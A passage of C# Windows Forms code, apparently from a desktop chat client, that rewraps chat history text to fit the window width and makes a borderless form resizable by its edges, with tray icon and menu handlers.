                        k1 = false;
                        k2 = false;
                        k3 = false;
                        k4 = false;
                        k5 = true;
                    }
                }
                if (this.Width >= 1451 && this.Width <= 1700) {
                    if (!k1) {
                        NumOfChar = 80 + ((this.Width - 1240) / 4 - 42);
                        NewHistory();
                        k = false;
                        k1 = true;
                        k2 = false;
                        k3 = false;
                        k4 = false;
                        k5 = false;
                    }
                }
                if (this.Width >= 1701 && this.Width <= 1800) {
                    if (!k2) {
                        NumOfChar = 80 + ((this.Width - 1240) / 6 + 20);
                        NewHistory();
                        k = false;
                        k1 = false;
                        k2 = true;
                        k3 = false;
                        k4 = false;
                        k5 = false;
                    }
                }
                if (this.Width >= 1801 && this.Width <= 1880) {
                    if (!k3) {
                        NumOfChar = 80 + ((this.Width - 1240) / 4 - 60);
                        NewHistory();
                        k = false;
                        k1 = false;
                        k2 = false;
                        k3 = true;
                        k4 = false;
                        k5 = false;
                    }
                }
                if (this.Width >= 1881 && this.Width <= 1920) {
                    if (!k4) {
                        NumOfChar = 80 + ((this.Width - 1240) / 5);
                        NewHistory();
                        k = false;
                        k1 = false;
                        k2 = false;
                        k3 = false;
                        k4 = true;
                        k5 = false;
                    }
                }
            }
        }

        private void NewHistory()
        {
            newSizeforText = new List<string>();
            NEW = new List<string>();
            int CountNull = InfoSequence.Count;

            foreach (string _1 in ChatHistory.Lines) {
                if (_1 == "") {
                    newSizeforText.Add(_1);
                    continue;
                }
            }
            CountNull = newSizeforText.Count;

            List<int> Length = new List<int>() { 0 };
            bool IsFirst = false;
            bool _A = false;
            bool cont = false;
            foreach (string _1 in ChatHistory.Lines) {
                if (!_A) {
                    NEW.Add(_1);
                    _A = true;
                    continue;
                }
                if (IsFirst) {
                    NEW.Add(_1);
                    IsFirst = false;
                    continue;
                }
                if (_1 == "") {
                    NEW.Add(null);
                    IsFirst = true;
                    continue;
                }
                String[] _2 = _1.Split(' ');
                foreach (var _3 in _2) {
                    if (w.Length + _3.Length > NumOfChar) {
                        w = w.Trim(' ');
                        NEW.Add(w);
                        w = "";
                    }
                    w += _3 + ' ';
                }
                if (w != "") {
                    w = w.Trim(' ');
                    NEW.Add(w);
                    w = "";
                }
            }
            FillInfo(Length);  //FILL INFO for ENTER
            ChatHistory.Text = "";
            for (int i = 1; i < NEW.Count; i++) {
                if (NEW[i] == null) {
                    Length.Add(i + 1);
                    cont = true;
                    continue;
                }
                if (cont)
                    continue;
            }
            this.Invoke((MethodInvoker)(() => {
                for (int i = 0; i < NEW.Count; i++) {
                    ChatHistory.Text += NEW[i];
                    if (i != NEW.Count - 1)
                        ChatHistory.Text += Environment.NewLine;
                }
            }));
        }
        private void FillInfo(List<int> Length)
        {
            Info = new List<string>();
            for (int p = 0; p < Length.Count; p++) {
                if (Length.Count > p + 1)
                    for (int i = Length[p]; i < Length[p + 1] - 1; i++)
                        Info.Add(InfoSequence[p]);
                Info.Add(null);
            }
        }
        //RESIZE FORM-------------------------------------------------------------------------

        protected override void OnPaint(PaintEventArgs e)
        {
            e.Graphics.FillRectangle(new SolidBrush(DGray), Top);
            e.Graphics.FillRectangle(new SolidBrush(DGray), Left);
            e.Graphics.FillRectangle(new SolidBrush(DGray), Right);
            e.Graphics.FillRectangle(new SolidBrush(DGray), Bottom);
        }

        private const int
            HTLEFT = 10,
            HTRIGHT = 11,
            HTTOP = 12,
            HTTOPLEFT = 13,
            HTTOPRIGHT = 14,
            HTBOTTOM = 15,
            HTBOTTOMLEFT = 16,
            HTBOTTOMRIGHT = 17;

        const int _ = 5; // you can rename this variable if you like

        Rectangle Top { get { return new Rectangle(0, 0, this.ClientSize.Width, _); } }
        Rectangle Left { get { return new Rectangle(0, 0, _, this.ClientSize.Height); } }
        Rectangle Bottom { get { return new Rectangle(0, this.ClientSize.Height - _, this.ClientSize.Width, _); } }
        Rectangle Right { get { return new Rectangle(this.ClientSize.Width - _, 0, _, this.ClientSize.Height); } }
        Rectangle TopLeft { get { return new Rectangle(0, 0, _, _); } }
        Rectangle TopRight { get { return new Rectangle(this.ClientSize.Width - _, 0, _, _); } }
        Rectangle BottomLeft { get { return new Rectangle(0, this.ClientSize.Height - _, _, _); } }
        Rectangle BottomRight { get { return new Rectangle(this.ClientSize.Width - _, this.ClientSize.Height - _, _, _); } }

        protected override void WndProc(ref System.Windows.Forms.Message message)
        {
            base.WndProc(ref message);

            if (message.Msg == 0x84) // WM_NCHITTEST
            {
                var cursor = this.PointToClient(Cursor.Position);

                if (TopLeft.Contains(cursor))
                    message.Result = (IntPtr)HTTOPLEFT;
                else if (TopRight.Contains(cursor))
                    message.Result = (IntPtr)HTTOPRIGHT;
                else if (BottomLeft.Contains(cursor))
                    message.Result = (IntPtr)HTBOTTOMLEFT;
                else if (BottomRight.Contains(cursor))
                    message.Result = (IntPtr)HTBOTTOMRIGHT;

                else if (Top.Contains(cursor))
                    message.Result = (IntPtr)HTTOP;
                else if (Left.Contains(cursor))
                    message.Result = (IntPtr)HTLEFT;
                else if (Right.Contains(cursor))
                    message.Result = (IntPtr)HTRIGHT;
                else if (Bottom.Contains(cursor))
                    message.Result = (IntPtr)HTBOTTOM;
            }
        }
        //RESIZE FORM-------------------------------------------------------------------------

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Show();
        }

        private void notifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            this.Show();
        }

        private void notifyIcon1_BalloonTipClicked(object sender, EventArgs e)
        {
            this.Show();
        }
    }
}

